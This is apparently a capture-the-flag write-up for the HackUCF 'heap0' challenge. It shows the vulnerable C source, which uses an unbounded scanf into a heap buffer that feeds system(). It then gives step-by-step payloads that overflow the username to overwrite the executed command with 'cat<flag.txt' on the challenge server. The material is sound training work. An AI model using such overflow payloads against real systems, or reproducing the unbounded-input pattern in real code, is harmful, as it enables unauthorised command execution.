# heap0
**Category:** Pwn

**Points:** 10

**Description:**

Author: kcolley
nc ctf.hackucf.org 7003

> **Files: heap0, heap0.c, libpwnableharness32.so

## Write-up
This seems to be a heap overflow problem. 

When the program is run, it asks you to enter a username, and then performs an `ls`:
```bash
> ./heap0 
username at 0x58210008
shell at 0x58210040
Enter username: chris
Hello, chris. Your shell is /bin/ls.
heap0  heap0.c	libpwnableharness32.so
```
When run on the server, we can see the flag.txt is listed:
```bash
> nc ctf.hackucf.org 7003
username at 0x581e1008
shell at 0x581e1040
Enter username: hello
Hello, hello. Your shell is /bin/ls.
flag.txt
heap0
```
We can also see from the output that the `username` comes before the `shell` in memory, and there is 56 (0x38) bytes between them. This is the 50 bytes of data plus some extra `malloc()` information.

A look at the code shows these are created on the heap and `scanf()` is used to get the user input into the `username` variable:
```c
void handle_connection(int sock) {
	char* username = malloc(50);
	char* shell = malloc(50);
	
	printf("username at %p\n", username);
	printf("shell at %p\n", shell);
	
	strcpy(shell, "/bin/ls");
	
	printf("Enter username: ");
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
}
```
Whatever is in the `shell` variable is executed by the `system()` function, so if we can get that `shell` to contain `/bin/cat flag.txt` we may be able to see the flag contents.

First I check that writing 56 characters as the username does impact on the `shell` variable without crashing the program:
```bash
> python -c "print('A' * 56)" | ./heap0 
username at 0x569ac008
shell at 0x569ac040
Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is .
```

So 56 had some effect on the `shell` (erasing its contents altogether), so I tried 57:
```bash
> python -c "print('A' * 57)" | ./heap0 
username at 0x57722008
shell at 0x57722040
Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is A.
sh: 1: A: not found
```
That last 'A' now appears in the `shell`. Can I put a `cat` command in there?
```bash
python -c "print('A' * 56 + 'cat heap0.c')" | ./heap0 
username at 0x56651008
shell at 0x56651040
Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat. Your shell is cat.
```
Only the `cat` part got through, but not the `heap0.c`. After playing around for a while, I realized it was `scanf()` interpreting a space as an end to input, so I needed to find another method to display the file contents.

After some though I realized that another form of `cat heap0.c` would be `cat < heap0.c` which can be specified without spaces:
```bash
python -c "print('A' * 55 + '\0cat<heap0.c')" | ./heap0
username at 0x56dd9008
shell at 0x56dd9040
Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is cat<heap0.c.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "pwnable_harness.h"
...
```
> Note: I also added the `\0` to neaten it up, but this isn't really necessary!

This printed out the contents of the C file, so now I'd tested it locally, I could run it on the server with `flag.txt`:
```bash
python -c "print('A' * 55 + '\0cat<flag.txt')" | nc ctf.hackucf.org 7003
username at 0x5718c008
shell at 0x5718c040
Enter username: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Your shell is cat<flag.txt.
```
This worked, and gave me the flag.
